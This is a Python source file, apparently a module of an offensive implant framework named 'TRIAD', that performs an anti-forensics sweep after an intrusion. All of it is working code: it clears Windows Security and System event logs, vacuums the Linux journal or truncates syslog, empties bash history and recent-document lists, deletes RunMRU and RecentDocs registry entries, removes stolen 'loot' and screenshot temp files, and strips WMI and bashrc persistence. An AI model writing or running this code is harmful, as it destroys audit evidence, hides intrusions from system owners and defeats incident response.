import os
import ctypes
import subprocess

if os.name == 'nt':
    from ctypes import wintypes
    from engines.windows.vx_eng import SyscallResolver
    import winreg
else:
    # provide simple wintypes dummy on non-Windows
    class _Wintypes:
        DWORD = int
        LONG = int
        WORD = int

    wintypes = _Wintypes()
    SyscallResolver = None
    winreg = None


def clear_event_logs(log_names=None):
    """Clear event logs.

    On Windows this uses the native ClearEventLogW API.  On Linux it invokes
    journalctl to rotate/vacuum the systemd journal or simply truncates
    /var/log/* as a coarse approximation.
    """
    if os.name != 'nt':
        # attempt to rotate and vacuum the journal
        try:
            subprocess.run(["journalctl", "--rotate"], check=False)
            subprocess.run(["journalctl", "--vacuum-time=1s"], check=False)
        except Exception:
            # fallback: truncate /var/log/syslog if accessible
            try:
                with open("/var/log/syslog","w"):
                    pass
            except Exception:
                pass
        return

    if log_names is None:
        log_names = ["Security", "System"]

    resolver = SyscallResolver()
    try:
        ClearEventLogW = resolver.get(
            "ClearEventLogW",
            wintypes.BOOL,
            [wintypes.HANDLE, wintypes.LPCWSTR],
        )
    except Exception:
        # fallback to advapi32
        adv = ctypes.windll.advapi32
        for name in log_names:
            adv.ClearEventLogW(None, name)
        return

    for name in log_names:
        # passing NULL handle clears local log
        ClearEventLogW(None, name)


def _clear_mru():
    """Remove MRU/history entries.

    On Windows this clears registry RunMRU/RecentDocs.  On Linux we remove
    common shell histories and recent documents file.
    """
    if os.name != 'nt':
        # bash history
        try:
            hist = os.path.expanduser("~/.bash_history")
            open(hist, "w").close()
        except Exception:
            pass
        # freedesktop recent files
        try:
            rec = os.path.expanduser("~/.local/share/recently-used.xbel")
            open(rec, "w").close()
        except Exception:
            pass
        return

    roots = [
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
    ]
    for key_path in roots:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                # enumerate and delete all values
                i = 0
                to_del = []
                while True:
                    try:
                        name, _, _ = winreg.EnumValue(key, i)
                        to_del.append(name)
                        i += 1
                    except OSError:
                        break
                for name in to_del:
                    try:
                        winreg.DeleteValue(key, name)
                    except Exception:
                        pass
        except Exception:
            pass


def _wipe_temp_files():
    """Remove temp files matching patterns from LootPacker and screenshots."""
    import glob, os
    temp = os.environ.get("LOCALAPPDATA") or os.environ.get("TEMP") or os.getcwd()
    patterns = ["~LOOT*.dat", "~WRD*.tmp.bmp"]
    for pat in patterns:
        for f in glob.glob(os.path.join(temp, pat)):
            try:
                os.remove(f)
            except Exception:
                pass


def _remove_wmi_persistence():
    """Remove any persistence mechanisms installed by deploy_persistence."""
    if os.name != 'nt':
        # remove startup script appended to bashrc
        bashrc = os.path.expanduser("~/.bashrc")
        try:
            lines = []
            with open(bashrc, "r") as f:
                for l in f:
                    if "# TRIAD persistence" in l or "triad" in l and "startup.sh" in l:
                        continue
                    lines.append(l)
            with open(bashrc, "w") as f:
                f.writelines(lines)
        except Exception:
            pass
        return
    ps = (
        "if (Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='TRIADProcStart'\") {"
        "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='TRIADProcStart'\" | Remove-WmiObject;}"
        "if (Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='TRIADAction'\") {"
        "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='TRIADAction'\" | Remove-WmiObject;}"
    )
    try:
        subprocess.run(["powershell", "-Command", ps], capture_output=True)
    except Exception:
        pass


def deep_wipe(remove_wmi: bool = False) -> None:
    """Perform a full anti-forensics sweep.

    - Clear event logs
    - Erase MRU registry lists
    - Delete temporary files created by TRIAD
    - Optionally uninstall WMI persistence.
    """
    # clear logs
    clear_event_logs()
    # wipe MRU
    _clear_mru()
    # erase temp loot files
    _wipe_temp_files()
    # remove WMI if requested
    if remove_wmi:
        _remove_wmi_persistence()
